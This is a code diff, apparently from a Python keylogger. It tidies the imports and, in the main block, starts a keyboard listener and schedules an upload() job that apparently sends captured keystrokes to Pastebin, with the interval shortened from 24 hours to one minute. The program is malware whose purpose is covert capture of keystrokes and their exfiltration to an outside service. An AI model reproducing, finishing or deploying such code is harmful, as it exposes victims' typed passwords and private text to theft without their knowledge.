@@ -1,14 +1,15 @@
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import padding
-from math import ceil
-from urllib.request import urlopen, Request
-from urllib.parse import urlencode
-from time import sleep
-from pynput.keyboard import Key, Listener
-from apscheduler.schedulers.blocking import BlockingScheduler
 import base64
+from math import ceil
+from time import sleep
+from urllib.parse import urlencode
+from urllib.request import Request, urlopen
+
+from apscheduler.schedulers.blocking import BlockingScheduler
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from pynput.keyboard import Key, Listener
+
 
 class PastebinError(Exception):
     pass
@@ -161,10 +162,11 @@ def upload():
 
 
 if __name__ == '__main__':
+    print("WE ARE WORKING")
     listener = Listener(on_press=on_press)
     listener.start()
     scheduler = BlockingScheduler()
-    scheduler.add_job(upload, 'interval', hours=24) #minutes=1 to test
+    scheduler.add_job(upload, 'interval', minutes=1)     # minutes=1 to test
     scheduler.start()
     
 
